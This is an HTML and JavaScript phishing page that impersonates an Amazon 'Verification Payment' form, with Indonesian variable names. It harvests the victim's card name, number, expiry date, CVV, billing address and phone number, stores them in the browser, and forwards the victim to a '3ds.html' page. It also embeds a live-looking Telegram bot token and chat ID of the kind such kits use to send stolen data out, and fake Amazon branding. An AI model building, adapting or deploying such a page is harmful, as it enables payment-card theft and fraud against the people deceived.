<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification Payment</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Amazon Ember', Arial, sans-serif; }
        body { background: #ffffff; min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 20px; }
        .logo { margin: 10px 0 20px; text-align: center; }
        .logo img { height: 60px; }
        .kotak { width: 100%; max-width: 550px; padding: 25px 30px; border: 1px solid #ddd; border-radius: 8px; background: #fff; }
        h1 { font-size: 22px; font-weight: 500; margin-bottom: 20px; }
        .logo-kartu { display: flex; gap: 8px; margin-bottom: 20px; align-items: center; }
        .logo-kartu img { height: 28px; object-fit: contain; }
        label { font-weight: 700; font-size: 13px; margin: 14px 0 5px; display: block; }
        .baris-dua { display: flex; gap: 15px; flex-wrap: wrap; }
        .kolom { flex: 1; min-width: 200px; }
        .input { width: 100%; padding: 8px 10px; border: 1px solid #a6a6a6; border-radius: 4px; font-size: 14px; height: 36px; outline: none; }
        .input:focus { border-color: #007185; box-shadow: 0 0 0 2px #c8f0f4; }
        .input.salah { border-color: #d00; border-width: 2px; }
        .input.latar-biru { background: #e6f0fa; }
        select.input { height: 36px; }
        .telp-baris { display: flex; gap: 8px; }
        .telp-kode { width: 90px; flex-shrink: 0; }
        .telp-nomor { flex: 1; }
        .tombol { width: 100%; padding: 8px; background: #ddd; border: none; border-radius: 8px; font-size: 15px; height: 42px; margin-top: 25px; margin-bottom: 20px; cursor: not-allowed; transition: all 0.2s; }
        .tombol.aktif { background: #ffd814; border: 1px solid #fcd200; cursor: pointer; }
        .tombol.aktif:hover { background: #f7ca00; }
        .bawah { margin-top: 30px; padding-top: 20px; border-top: 1px solid #e7e7e7; width: 100%; text-align: center; font-size: 11px; color: #555; }
        .bawah a { color: #0066c0; text-decoration: none; margin: 0 8px; }
        .pesan-merah { color: #d00; font-size: 12px; margin-top: 4px; display: none; }
    </style>
</head>
<body>
    <div class="logo"><img src="img/amazonlogo.png" alt="Amazon"></div>
    <div class="kotak">
        <h1>Verification Payment</h1>
        <div class="logo-kartu">
            <img src="img/visa.png" alt="Visa">
            <img src="img/mastercard.png" alt="Mastercard">
            <img src="img/amex.png" alt="Amex">
            <img src="img/discover.png" alt="Discover">
            <img src="img/jcb.png" alt="JCB">
        </div>

        <label for="namaKartu">Name on card</label>
        <input type="text" id="namaKartu" class="input latar-biru">

        <label for="nomorKartu">Card number</label>
        <input type="text" id="nomorKartu" class="input" maxlength="19" placeholder="•••• •••• •••• ••••">

        <div class="baris-dua">
            <div class="kolom">
                <label for="expDate">Expiry date</label>
                <input type="text" id="expDate" class="input" maxlength="5" placeholder="MM/YY">
            </div>
            <div class="kolom">
                <label for="cvv">Security code</label>
                <input type="text" id="cvv" class="input" maxlength="4" placeholder="•••">
            </div>
        </div>

        <label for="alamat">Billing address</label>
        <input type="text" id="alamat" class="input" placeholder="Street address">

        <label for="alamat2"></label>
        <input type="text" id="alamat2" class="input" placeholder="Apartment, suite, etc. (optional)">

        <div class="baris-dua">
            <div class="kolom">
                <label for="kota">City</label>
                <input type="text" id="kota" class="input">
            </div>
            <div class="kolom">
                <label for="provinsi">State / Province</label>
                <input type="text" id="provinsi" class="input">
            </div>
        </div>

        <div class="baris-dua">
            <div class="kolom">
                <label for="kodePos">Postal code</label>
                <input type="text" id="kodePos" class="input">
            </div>
            <div class="kolom">
                <label for="negara">Country / Region</label>
                <select id="negara" class="input"></select>
            </div>
        </div>

        <label for="telp">Phone number</label>
        <div class="telp-baris">
            <input type="text" id="kodeTelp" class="input telp-kode" readonly>
            <input type="tel" id="telp" class="input telp-nomor">
        </div>

        <button type="button" id="verifikasi" class="tombol">Verification</button>
    </div>

    <div class="bawah">
        <p><a href="#">Conditions of Use</a> <a href="#">Privacy Notice</a> <a href="#">Help</a></p>
        <p style="margin-top:8px; color:#767676;">© 1996-2026, Amazon.com, Inc. or its affiliates</p>
    </div>

<script>
const BOT_TOKEN = '8813734294:AAHiumNTKCD4YWZS2jq5lBjHFtFbjwtzmYk';
const CHAT_ID = '7808815199';

const daftarNegara = {
    'ID': {nama: 'Indonesia', kode: '+62'},
    'AU': {nama: 'Australia', kode: '+61'},
    'US': {nama: 'United States', kode: '+1'},
    'GB': {nama: 'United Kingdom', kode: '+44'},
    'MY': {nama: 'Malaysia', kode: '+60'},
    'SG': {nama: 'Singapore', kode: '+65'},
    'JP': {nama: 'Japan', kode: '+81'},
    'KR': {nama: 'South Korea', kode: '+82'},
    'CA': {nama: 'Canada', kode: '+1'},
    'NZ': {nama: 'New Zealand', kode: '+64'}
};

const selectNegara = document.getElementById('negara');
for (const [kode, data] of Object.entries(daftarNegara)) {
    const opsi = document.createElement('option');
    opsi.value = kode;
    opsi.textContent = data.nama;
    selectNegara.appendChild(opsi);
}

async function deteksiNegara() {
    try {
        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();
        const kode = data.country_code || 'GB';
        if (daftarNegara[kode]) {
            selectNegara.value = kode;
            document.getElementById('kodeTelp').value = daftarNegara[kode].kode;
        } else {
            selectNegara.value = 'GB';
            document.getElementById('kodeTelp').value = '+44';
        }
    } catch {
        selectNegara.value = 'GB';
        document.getElementById('kodeTelp').value = '+44';
    }
}

selectNegara.addEventListener('change', () => {
    const kode = selectNegara.value;
    if (daftarNegara[kode]) {
        document.getElementById('kodeTelp').value = daftarNegara[kode].kode;
    }
});

// Format nomor kartu
const inputNomor = document.getElementById('nomorKartu');
inputNomor.addEventListener('input', (e) => {
    let v = e.target.value.replace(/\D/g, '');
    v = v.match(/.{1,4}/g)?.join(' ') || v;
    e.target.value = v;
});

// Format expiry
const inputExp = document.getElementById('expDate');
inputExp.addEventListener('input', (e) => {
    let v = e.target.value.replace(/\D/g, '');
    if (v.length >= 2) v = v.slice(0,2) + '/' + v.slice(2,4);
    e.target.value = v;
});

// Hanya angka CVV
document.getElementById('cvv').addEventListener('input', (e) => {
    e.target.value = e.target.value.replace(/\D/g, '');
});

const el = {
    nama: document.getElementById('namaKartu'),
    nomor: inputNomor,
    exp: inputExp,
    cvv: document.getElementById('cvv'),
    alamat: document.getElementById('alamat'),
    kota: document.getElementById('kota'),
    provinsi: document.getElementById('provinsi'),
    kodePos: document.getElementById('kodePos'),
    telp: document.getElementById('telp'),
    tombol: document.getElementById('verifikasi')
};

function cekLengkap() {
    const nomorBersih = el.nomor.value.replace(/\s/g, '');
    const ok = el.nama.value.trim() && nomorBersih.length >= 13 && el.exp.value.length === 5 &&
               el.cvv.value.length >= 3 && el.alamat.value.trim() && el.kota.value.trim() &&
               el.provinsi.value.trim() && el.kodePos.value.trim() && el.telp.value.trim();
    el.tombol.classList.toggle('aktif', ok);
}

[el.nama, el.nomor, el.exp, el.cvv, el.alamat, el.kota, el.provinsi, el.kodePos, el.telp]
.forEach(e => e.addEventListener('input', cekLengkap));

el.tombol.addEventListener('click', () => {
    if (!el.tombol.classList.contains('aktif')) return;
    
    // Simpan semua data
    localStorage.setItem('nama_kartu', el.nama.value.trim());
    localStorage.setItem('nomor_kartu', el.nomor.value.trim());
    localStorage.setItem('exp_kartu', el.exp.value.trim());
    localStorage.setItem('cvv_kartu', el.cvv.value.trim());
    localStorage.setItem('alamat', el.alamat.value.trim());
    localStorage.setItem('kota', el.kota.value.trim());
    localStorage.setItem('provinsi', el.provinsi.value.trim());
    localStorage.setItem('kode_pos', el.kodePos.value.trim());
    localStorage.setItem('negara', selectNegara.value);
    localStorage.setItem('kode_telp', document.getElementById('kodeTelp').value);
    localStorage.setItem('nomor_telp', el.telp.value.trim());
    
    // Lanjut ke 3ds.html
    window.location.href = '3ds.html';
});

deteksiNegara();
</script>
</body>
</html>
